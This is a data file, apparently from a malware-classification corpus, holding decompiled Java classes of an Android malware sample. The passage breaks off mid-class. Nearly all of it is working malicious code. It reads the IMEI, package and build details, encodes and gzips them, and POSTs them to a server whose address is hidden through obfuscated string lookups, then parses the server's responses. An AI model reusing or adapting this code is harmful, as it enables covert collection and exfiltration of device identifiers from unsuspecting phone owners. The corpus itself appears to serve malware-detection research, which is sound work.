INTEGER,"");     str5=e.f;     StringBuilder append6=append5.append(str5).append("" INTEGER,"");     str6=e.g;     StringBuilder append7=append6.append(str6).append("" INTEGER,"");     str7=e.i;     StringBuilder append8=append7.append(str7).append("" TEXT,"");     str8=e.h;     StringBuilder append9=append8.append(str8).append("" TEXT,"");     str9=e.j;     StringBuilder append10=append9.append(str9).append("" INTEGER, "");     str10=e.k;     StringBuilder append11=append10.append(str10).append("" TEXT, "");     str11=e.l;     sQLiteDatabase.execSQL(append11.append(str11).append("" LONG DEFAULT "").append(currentTimeMillis).append("");"").toString());   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS "" + com.baty.dasy.resy.cac.j.a.a(103));     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@176ae1d8"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\a.code","public class a implements f {   private static final String B=com.baty.dasy.resy.cac.j.a.a(111);   public String a;   public String b;   public int f8c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public String m;   public String n;   public String o;   public int p;   public int q;   public String r;   public int s=0;   public int t=120;   public boolean u=false;   public boolean v=false;   public boolean w=false;   public int x=-1;   public int y=0;   public int z=0;   public int A=0;   @Override public JSONObject d(){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f8c);       jSONObject.put(""d"",this.d);       jSONObject.put(""e"",this.e);       jSONObject.put(""f"",this.f);       jSONObject.put(""g"",this.g);       jSONObject.put(""h"",this.h);       jSONObject.put(""i"",this.i);       jSONObject.put(""j"",this.j);       jSONObject.put(""k"",this.k);       jSONObject.put(""l"",this.l);       jSONObject.put(""m"",this.m);       jSONObject.put(""n"",this.n);       jSONObject.put(""o"",this.o);       jSONObject.put(""p"",this.p);       jSONObject.put(""q"",this.q);       jSONObject.put(""r"",this.r);       jSONObject.put(""s"",this.s);       jSONObject.put(""t"",this.t);       jSONObject.put(""u"",this.z);       jSONObject.put(""v"",this.A);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.f8c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? -1 : jSONObject.getInt(""e"");       this.f=jSONObject.isNull(""f"") ? null : jSONObject.getString(""f"");       this.g=jSONObject.isNull(""g"") ? null : jSONObject.getString(""g"");       this.h=jSONObject.isNull(""h"") ? null : jSONObject.getString(""h"");       this.i=jSONObject.isNull(""i"") ? -1 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? null : jSONObject.getString(""j"");       this.k=jSONObject.isNull(""k"") ? null : jSONObject.getString(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.n=jSONObject.isNull(""n"") ? """" : jSONObject.getString(""n"");       this.o=jSONObject.isNull(""o"") ? """" : jSONObject.getString(""o"");       this.p=jSONObject.isNull(""p"") ? -1 : jSONObject.getInt(""p"");       this.q=jSONObject.isNull(""q"") ? -1 : jSONObject.getInt(""q"");       this.r=jSONObject.isNull(""r"") ? """" : jSONObject.getString(""r"");       this.s=jSONObject.isNull(""s"") ? 0 : jSONObject.getInt(""s"");       this.t=jSONObject.isNull(""t"") ? 0 : jSONObject.getInt(""t"");       this.z=jSONObject.isNull(""u"") ? 0 : jSONObject.getInt(""u"");       this.A=jSONObject.isNull(""v"") ? 0 : jSONObject.getInt(""v"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   public boolean a(  String str){     String[] a=com.baty.dasy.resy.cac.j.d.a(str,B);     if (a == null) {       return false;     }     try {       this.a=a[0];       this.b=a[1];       this.f8c=Byte.valueOf(a[2]).byteValue();       this.d=a[3];       this.e=Integer.valueOf(a[4]).intValue();       this.f=a[5];       this.g=a[6];       this.h=a[7];       this.i=Integer.valueOf(a[8]).intValue();       this.j=a[9];       this.k=a[10];       this.l=a[11];       this.m=a[12];       this.n=a[13];       this.o=a[14];       this.p=Integer.valueOf(a[15]).intValue();       this.q=Integer.valueOf(a[16]).intValue();       this.r=a[17];       this.x=Integer.valueOf(a[18]).intValue();       this.y=Integer.valueOf(a[19]).intValue();       this.s=Integer.valueOf(a[20]).intValue();       this.t=Integer.valueOf(a[21]).intValue();       this.z=Integer.valueOf(a[22]).intValue();       this.A=Integer.valueOf(a[23]).intValue();       return true;     }  catch (    Exception e) {       return false;     }   }   @Override public String b(){     return ""c"";   }   public String c(){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(this.a);     stringBuffer.append(B);     stringBuffer.append(this.b);     stringBuffer.append(B);     stringBuffer.append(this.f8c);     stringBuffer.append(B);     stringBuffer.append(this.d);     stringBuffer.append(B);     stringBuffer.append(this.e);     stringBuffer.append(B);     stringBuffer.append(this.f);     stringBuffer.append(B);     stringBuffer.append(this.g);     stringBuffer.append(B);     stringBuffer.append(this.h);     stringBuffer.append(B);     stringBuffer.append(this.i);     stringBuffer.append(B);     stringBuffer.append(this.j);     stringBuffer.append(B);     stringBuffer.append(this.k);     stringBuffer.append(B);     stringBuffer.append(this.l);     stringBuffer.append(B);     stringBuffer.append(this.m);     stringBuffer.append(B);     stringBuffer.append(this.n);     stringBuffer.append(B);     stringBuffer.append(this.o);     stringBuffer.append(B);     stringBuffer.append(this.p);     stringBuffer.append(B);     stringBuffer.append(this.q);     stringBuffer.append(B);     stringBuffer.append(this.r);     stringBuffer.append(B);     stringBuffer.append(this.x);     stringBuffer.append(B);     stringBuffer.append(this.y);     stringBuffer.append(B);     stringBuffer.append(this.s);     stringBuffer.append(B);     stringBuffer.append(this.t);     stringBuffer.append(B);     stringBuffer.append(this.z);     stringBuffer.append(B);     stringBuffer.append(this.A);     stringBuffer.append(B);     return stringBuffer.toString();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\b.code","public class b implements f {   public int a;   public int b;   public int f9c;   private final int d=2;   @Override public JSONObject d(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f9c);       jSONObject.put(""d"",2);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public void a(  JSONObject jSONObject){     try {       this.a=jSONObject.isNull(""a"") ? 0 : jSONObject.getInt(""a"");       this.b=jSONObject.isNull(""b"") ? 0 : jSONObject.getInt(""b"");       this.f9c=jSONObject.isNull(""c"") ? 0 : jSONObject.getInt(""c"");       this.f9c=jSONObject.isNull(""d"") ? 0 : jSONObject.getInt(""d"");     }  catch (    Exception e) {     }   }   @Override public String b(){     return ""g"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\c.code","public class c implements f {   private List a;   private Class b;   public c(  Class cls){     this.b=cls;   }   public c(  List list){     this.a=list;   }   public List a(){     if (this.a == null) {       this.a=new ArrayList();     }     return this.a;   }   public void a(  JSONArray jSONArray){     try {       int length=jSONArray.length();       this.a=new ArrayList();       for (int i=0; i < length; i++) {         JSONObject jSONObject=jSONArray.getJSONObject(i);         f fVar=(f)this.b.newInstance();         fVar.a(jSONObject);         this.a.add(fVar);       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public void a(  JSONObject jSONObject){   }   @Override public String b(){     if (this.a != null && this.a.size() > 0) {       return ((f)this.a.get(0)).b();     }     if (this.b != null) {       try {         return ((f)this.b.newInstance()).b();       }  catch (      Exception e) {         e.printStackTrace();       }     }     return ""error"";   }   @Override public Object d(){     try {       JSONArray jSONArray=new JSONArray();       int size=this.a.size();       for (int i=0; i < size; i++) {         jSONArray.put(i,((f)this.a.get(i)).d());       }       return jSONArray;     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\d.code","public class d implements f {   public int a;   @Override public JSONObject d(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public void a(  JSONObject jSONObject){     try {       this.a=jSONObject.isNull(""a"") ? 0 : jSONObject.getInt(""a"");     }  catch (    Exception e) {     }   }   @Override public String b(){     return ""b"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\e.code","public class e implements f {   public static String s=com.baty.dasy.resy.cac.j.a.a(303);   public String a;   public String b;   public String f10c;   public String d;   public String e;   public int f;   public int g;   public int h;   public int i;   public double j;   public double k;   public String l;   public String m;   public String n;   public String o;   public String p;   public String q;   public int r;   public e(  Context context){     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     this.f10c=com.baty.dasy.resy.cac.j.d.a(context);     this.d=telephonyManager.getDeviceId();     this.o=com.baty.dasy.resy.cac.j.d.b(context);     this.b=Build.PRODUCT + "";"" + Build.MODEL;     this.a=Build.VERSION.SDK;     this.p=context.getPackageName();     this.r=com.baty.dasy.resy.cac.j.d.d(context);     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.g=displayMetrics.densityDpi;     this.h=displayMetrics.widthPixels;     this.i=displayMetrics.heightPixels;     try {       PackageInfo packageInfo=context.getPackageManager().getPackageInfo(context.getPackageName(),0);       this.e=packageInfo.versionName;       this.f=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     this.n=com.baty.dasy.resy.cac.j.d.e(context);     this.m=com.baty.dasy.resy.cac.j.d.f(context);     if (this.m == null) {       this.m="""";     }   }   @Override public JSONObject d(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f10c);       jSONObject.put(""d"",this.d);       jSONObject.put(""e"",this.e);       jSONObject.put(""f"",this.f);       jSONObject.put(""g"",this.g);       jSONObject.put(""h"",this.h);       jSONObject.put(""i"",this.i);       jSONObject.put(""j"",this.j);       jSONObject.put(""k"",this.k);       jSONObject.put(""l"",this.l);       jSONObject.put(""m"",this.m);       jSONObject.put(""n"",this.n);       jSONObject.put(""o"",this.o);       jSONObject.put(""p"",this.p);       jSONObject.put(""q"",this.q);       jSONObject.put(""r"",this.r);       jSONObject.put(""s"",s);     }  catch (    Exception e) {       e.printStackTrace();     }     return jSONObject;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.f10c=jSONObject.isNull(""c"") ? null : jSONObject.getString(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? null : jSONObject.getString(""e"");       this.f=jSONObject.isNull(""f"") ? 0 : jSONObject.getInt(""f"");       this.g=jSONObject.isNull(""g"") ? 0 : jSONObject.getInt(""g"");       this.h=jSONObject.isNull(""h"") ? 0 : jSONObject.getInt(""h"");       this.i=jSONObject.isNull(""i"") ? 0 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? 0.0d : jSONObject.getDouble(""j"");       this.k=jSONObject.isNull(""k"") ? 0.0d : jSONObject.getDouble(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.n=jSONObject.isNull(""n"") ? null : jSONObject.getString(""n"");       this.o=jSONObject.isNull(""o"") ? null : jSONObject.getString(""o"");       this.p=jSONObject.isNull(""p"") ? null : jSONObject.getString(""p"");       this.q=jSONObject.isNull(""q"") ? null : jSONObject.getString(""q"");       this.r=jSONObject.isNull(""r"") ? 100008 : jSONObject.getInt(""r"");       s=jSONObject.isNull(""s"") ? null : jSONObject.getString(""s"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public String b(){     return ""a"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\f.code","public interface f extends Serializable {   void a(  JSONObject jSONObject);   String b();   Object d(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\g.code","public class g implements f {   public String a;   @Override public JSONObject d(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a != null ? this.a : """");     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public void a(  JSONObject jSONObject){     try {       this.a=jSONObject.isNull(""a"") ? """" : jSONObject.getString(""a"");     }  catch (    Exception e) {     }   }   @Override public String b(){     return ""d"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\h.code","public class h implements f {   private static final String C=com.baty.dasy.resy.cac.j.e.b(com.baty.dasy.resy.cac.j.a.a(302));   public String a;   public String b;   public int f11c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public boolean m;   public boolean n;   public boolean o;   public String p;   public boolean q;   public String r;   public String s;   public int t;   public int u;   public String x;   public int v=0;   public int w=0;   public String y="""";   public String z="""";   public boolean A=false;   public int B=-1;   @Override public JSONObject d(){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f11c);       jSONObject.put(""d"",this.d);       jSONObject.put(""e"",this.e);       jSONObject.put(""f"",this.f);       jSONObject.put(""g"",this.g);       jSONObject.put(""h"",this.h);       jSONObject.put(""i"",this.i);       jSONObject.put(""j"",this.j);       jSONObject.put(""k"",this.k);       jSONObject.put(""l"",this.l);       jSONObject.put(""m"",this.m);       jSONObject.put(""n"",this.n);       jSONObject.put(""o"",this.o);       jSONObject.put(""p"",this.p);       jSONObject.put(""q"",this.q);       jSONObject.put(""r"",this.r);       jSONObject.put(""s"",this.s);       jSONObject.put(""t"",this.t);       jSONObject.put(""u"",this.u);       jSONObject.put(""v"",this.y);       jSONObject.put(""w"",this.z);       jSONObject.put(""x"",this.x);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.f11c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? -1 : jSONObject.getInt(""e"");       this.f=jSONObject.isNull(""f"") ? null : jSONObject.getString(""f"");       this.g=jSONObject.isNull(""g"") ? null : jSONObject.getString(""g"");       this.h=jSONObject.isNull(""h"") ? null : jSONObject.getString(""h"");       this.i=jSONObject.isNull(""i"") ? -1 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? null : jSONObject.getString(""j"");       this.k=jSONObject.isNull(""k"") ? null : jSONObject.getString(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? true : jSONObject.getBoolean(""m"");       this.n=jSONObject.isNull(""n"") ? true : jSONObject.getBoolean(""n"");       this.o=jSONObject.isNull(""o"") ? false : jSONObject.getBoolean(""o"");       this.p=jSONObject.isNull(""p"") ? null : jSONObject.getString(""p"");       this.q=jSONObject.isNull(""q"") ? false : jSONObject.getBoolean(""q"");       this.r=jSONObject.isNull(""r"") ? null : jSONObject.getString(""r"");       this.s=jSONObject.isNull(""s"") ? null : jSONObject.getString(""s"");       this.t=jSONObject.isNull(""t"") ? 0 : jSONObject.getInt(""t"");       this.u=jSONObject.isNull(""u"") ? 0 : jSONObject.getInt(""u"");       this.y=jSONObject.isNull(""v"") ? null : jSONObject.getString(""v"");       this.z=jSONObject.isNull(""w"") ? null : jSONObject.getString(""w"");       this.x=jSONObject.isNull(""x"") ? null : jSONObject.getString(""x"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public String b(){     return ""e"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.c\i.code","public class i implements f {   public int a=-1;   public String b;   @Override public JSONObject d(){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override public void a(  JSONObject jSONObject){     try {       this.a=jSONObject.isNull(""a"") ? -1 : jSONObject.getInt(""a"");       this.b=jSONObject.isNull(""b"") ? """" : jSONObject.getString(""b"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public String b(){     return ""f"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.d\a.code","public class a {   private Context a;   private List b;   private String f13c;   public a(  Context context,  String str,  List list){     this.a=context;     this.f13c=str;     this.b=list;   }   private byte[] a(  InputStream inputStream){     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     GZIPInputStream gZIPInputStream;     byte[] bArr=null;     try {       gZIPInputStream=new GZIPInputStream(inputStream);       try {         byte[] bArr2=new byte[2048];         byteArrayOutputStream=new ByteArrayOutputStream();         while (true) {           try {             int read=gZIPInputStream.read(bArr2);             if (read == -1) {               break;             }             byteArrayOutputStream.write(bArr2,0,read);           }  catch (          Exception e) {             if (gZIPInputStream != null) {               try {                 gZIPInputStream.close();               }  catch (              IOException e2) {                 e2.printStackTrace();               }             }             if (byteArrayOutputStream != null) {               try {                 byteArrayOutputStream.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             return bArr;           } catch (          Throwable th2) {             th=th2;             if (gZIPInputStream != null) {               try {                 gZIPInputStream.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }             if (byteArrayOutputStream != null) {               try {                 byteArrayOutputStream.close();               }  catch (              IOException e5) {                 e5.printStackTrace();               }             }             throw th;           }         }         bArr=byteArrayOutputStream.toByteArray();         if (gZIPInputStream != null) {           try {             gZIPInputStream.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         if (byteArrayOutputStream != null) {           try {             byteArrayOutputStream.close();           }  catch (          IOException e7) {             e7.printStackTrace();           }         }       }  catch (      Exception e8) {         byteArrayOutputStream=null;       } catch (      Throwable th3) {         byteArrayOutputStream=null;         th=th3;       }     }  catch (    Exception e9) {       gZIPInputStream=null;       byteArrayOutputStream=null;     } catch (    Throwable th4) {       byteArrayOutputStream=null;       th=th4;       gZIPInputStream=null;     }     return bArr;   }   private byte[] a(  byte[] bArr){     GZIPOutputStream gZIPOutputStream;     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     byte[] bArr2=null;     try {       try {         byteArrayOutputStream=new ByteArrayOutputStream();       }  catch (      Throwable th2) {         th=th2;       }     }  catch (    Exception e) {       e=e;       gZIPOutputStream=null;       byteArrayOutputStream=null;     } catch (    Throwable th3) {       gZIPOutputStream=null;       byteArrayOutputStream=null;       th=th3;     }     try {       gZIPOutputStream=new GZIPOutputStream(byteArrayOutputStream);       try {         gZIPOutputStream.write(bArr);         gZIPOutputStream.finish();         bArr2=byteArrayOutputStream.toByteArray();         if (gZIPOutputStream != null) {           try {             gZIPOutputStream.close();           }  catch (          IOException e2) {             e2.printStackTrace();           }         }         if (byteArrayOutputStream != null) {           try {             byteArrayOutputStream.close();           }  catch (          IOException e3) {             e3.printStackTrace();           }         }       }  catch (      Exception e4) {         e=e4;         e.printStackTrace();         if (gZIPOutputStream != null) {           try {             gZIPOutputStream.close();           }  catch (          IOException e5) {             e5.printStackTrace();           }         }         if (byteArrayOutputStream != null) {           try {             byteArrayOutputStream.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         return bArr2;       }     }  catch (    Exception e7) {       e=e7;       gZIPOutputStream=null;     } catch (    Throwable th4) {       gZIPOutputStream=null;       th=th4;       if (gZIPOutputStream != null) {         try {           gZIPOutputStream.close();         }  catch (        IOException e8) {           e8.printStackTrace();         }       }       if (byteArrayOutputStream != null) {         try {           byteArrayOutputStream.close();         }  catch (        IOException e9) {           e9.printStackTrace();         }       }       throw th;     }     return bArr2;   }   public String a(){     if (this.b == null || this.b.size() == 0) {       return null;     }     try {       HttpPost httpPost=new HttpPost(this.f13c);       HttpClient a=q.a(this.a);       JSONObject jSONObject=new JSONObject();       for (      f fVar : this.b) {         jSONObject.put(fVar.b(),fVar.d());       }       String jSONObject2=jSONObject.toString();       l.a(jSONObject2);       httpPost.setEntity(new ByteArrayEntity(a(e.a(jSONObject2).getBytes(""utf-8""))));       HttpResponse execute=a.execute(httpPost);       int statusCode=execute.getStatusLine().getStatusCode();       l.a(Integer.valueOf(statusCode));       if (statusCode == 200) {         String b=e.b(new String(a(execute.getEntity().getContent()),""utf-8""));         l.a("""" + b);         return b;       }     }  catch (    Exception e) {     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.e\a.code","public class a {   public static int a=-1;   private static a b;   private com.baty.dasy.resy.cac.c.e f14c;   private Context d;   private a(  Context context){     this.d=context;     this.f14c=new com.baty.dasy.resy.cac.c.e(this.d);   }   public static synchronized a a(  Context context){     a aVar; synchronized (a.class) {       if (b == null) {         b=new a(context);       }       aVar=b;     }     return aVar;   }   private String a(  int i){     return com.baty.dasy.resy.cac.j.a.a(105) + ""?"" + com.baty.dasy.resy.cac.j.a.a(84)+ ""=""+ i;   }   public i a(  com.baty.dasy.resy.cac.c.b[] bVarArr){     i iVar=new i();     if (bVarArr == null || bVarArr.length == 0) {       iVar.a=0;     }  else {       com.baty.dasy.resy.cac.c.c cVar=new com.baty.dasy.resy.cac.c.c(Arrays.asList(bVarArr));       ArrayList arrayList=new ArrayList();       arrayList.add(this.f14c);       arrayList.add(cVar);       try {         JSONObject jSONObject=new JSONObject(new com.baty.dasy.resy.cac.d.a(this.d,a(3),arrayList).a());         String b2=iVar.b();         if (!jSONObject.isNull(b2)) {           iVar.a(jSONObject.getJSONObject(b2));         }       }  catch (      Exception e) {       }     }     return iVar;   }   public com.baty.dasy.resy.cac.c.a[] a(  com.baty.dasy.resy.cac.c.d dVar){     String a2=a(1);     if (a != -1) {       a2=a2 + com.baty.dasy.resy.cac.j.a.a(107) + a;       a=-1;     }     l.a("""" + this.f14c.o);     l.a("""" + this.f14c.n);     if (this.f14c.r != 100061) {       l.a("""" + this.f14c.r);     }     ArrayList arrayList=new ArrayList();     arrayList.add(this.f14c);     arrayList.add(dVar);     String a3=new com.baty.dasy.resy.cac.d.a(this.d,a2,arrayList).a();     try {       com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();       JSONObject jSONObject=new JSONObject(a3);       String b2=aVar.b();       if (jSONObject.isNull(b2)) {         return null;       }       JSONArray jSONArray=jSONObject.getJSONArray(b2);       com.baty.dasy.resy.cac.c.c cVar=new com.baty.dasy.resy.cac.c.c(com.baty.dasy.resy.cac.c.a.class);       cVar.a(jSONArray);       return (com.baty.dasy.resy.cac.c.a[])cVar.a().toArray(new com.baty.dasy.resy.cac.c.a[cVar.a().size()]);     }  catch (    Exception e) {       return null;     }   }   public h[] a(  g gVar){     String a2=a(2);     ArrayList arrayList=new ArrayList();     arrayList.add(this.f14c);     arrayList.add(gVar);     try {       JSONObject jSONObject=new JSONObject(new com.baty.dasy.resy.cac.d.a(this.d,a2,arrayList).a());       String b2=new h().b();       if (jSONObject.isNull(b2)) {         return null;       }       JSONArray jSONArray=jSONObject.getJSONArray(b2);       com.baty.dasy.resy.cac.c.c cVar=new com.baty.dasy.resy.cac.c.c(h.class);       cVar.a(jSONArray);       return (h[])cVar.a().toArray(new h[cVar.a().size()]);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.e\b.code","public class b {   public void a(  Context context,  int i){     new c(this,i,context).start();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.e\c.code","public class c extends Thread {   final int a;   final Context b;   final b f15c;   public c(  b bVar,  int i,  Context context){     this.f15c=bVar;     this.a=i;     this.b=context;   }   private com.baty.dasy.resy.cac.c.b[] a(  String str){     String[] a=com.baty.dasy.resy.cac.j.d.a(str,"";"");     if (a == null) {       return null;     }     com.baty.dasy.resy.cac.c.b[] bVarArr=new com.baty.dasy.resy.cac.c.b[a.length];     for (int i=0; i < a.length; i++) {       String[] a2=com.baty.dasy.resy.cac.j.d.a(a[i],"","");       if (a2 != null && a2.length == 2) {         com.baty.dasy.resy.cac.c.b bVar=new com.baty.dasy.resy.cac.c.b();         if (this.a == 1) {           bVar.a=1;         }  else {           bVar.a=2;         }         bVar.b=Integer.valueOf(a2[0]).intValue();         bVar.f9c=Integer.valueOf(a2[1]).intValue();         bVarArr[i]=bVar;       }     }     return bVarArr;   }   @Override public void run(){     super.run();     String g=this.a == 1 ? com.baty.dasy.resy.cac.j.d.g(this.b) : com.baty.dasy.resy.cac.j.d.h(this.b);     if (g == null || """".equals(g)) {       return;     }     com.baty.dasy.resy.cac.c.b[] a=a(g);     i a2=a.a(this.b).a(a);     if (a2 == null || !(a2 == null || a2.a == 0)) {       com.baty.dasy.resy.cac.j.d.a(this.b,a);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.e\d.code","public class d {   private Context a;   private int d;   private Handler b=new Handler();   private boolean f16c=false;   private f e=null;   public d(  Context context){     this.a=context;   }   public void a(  f fVar){     this.e=fVar;   }   public void a(  String str,  int i){     this.d=i;     new e(this,str).start();   }   public boolean a(){     return this.f16c;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.e\e.code","public class e extends Thread {   final String a;   final d b;   public e(  d dVar,  String str){     this.b=dVar;     this.a=str;   }   @Override public void run(){     Context context;     f fVar;     int i;     this.b.f16c=true;     g gVar=new g();     gVar.a=this.a;     context=this.b.a;     h[] a=a.a(context).a(gVar);     fVar=this.b.e;     i=this.b.d;     fVar.a(a,i);     try {       Thread.sleep(200L);     }  catch (    InterruptedException e) {       e.printStackTrace();     }     this.b.f16c=false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.e\f.code","public interface f {   void a(  h[] hVarArr,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\a.code","public class a extends e {   private HttpClient b;   public a(  Context context,  h hVar){     super(context,hVar);   }   @Override public boolean a(){     HttpRequestBase httpRequestBase;     if (c()) {       if (!l()) {         a(-4);         return false;       }       a((Exception)null);       a(-2);       this.b=new DefaultHttpClient();       float j=j();       if (j > 0.0f) {         this.b.getParams().setParameter(""http.socket.timeout"",Integer.valueOf((int)(j * 1000.0f)));         this.b.getParams().setParameter(""http.connection.timeout"",Integer.valueOf((int)(j * 1000.0f)));       }       g k=k();       if (k != null) {         this.b.getParams().setParameter(""http.route.default-proxy"",new HttpHost(k.a(),k.b(),""http""));       }       h d=d();       if (d.b() == 0) {         httpRequestBase=new HttpGet(d.toString());       }  else {         HttpPost httpPost=new HttpPost(d.c());         try {           httpPost.setEntity(new StringEntity(d.d()));         }  catch (        UnsupportedEncodingException e) {           e.printStackTrace();         }         httpRequestBase=httpPost;       }       Map a=d.a();       for (      String str : a.keySet()) {         httpRequestBase.addHeader(str,a.get(str).toString());       }       try {         HttpResponse execute=this.b.execute(httpRequestBase);         int statusCode=execute.getStatusLine().getStatusCode();         HashMap hashMap=new HashMap();         for (        Header header : execute.getAllHeaders()) {           hashMap.put(header.getName(),header.getValue());         }         a(hashMap);         a(execute.getEntity().getContent());         if (("""" + statusCode).startsWith(""2"")) {           a(200);           return true;         }         a(-3);         return false;       }  catch (      Exception e2) {         e2.printStackTrace();         a(e2);         a(-3);       } catch (      OutOfMemoryError e3) {         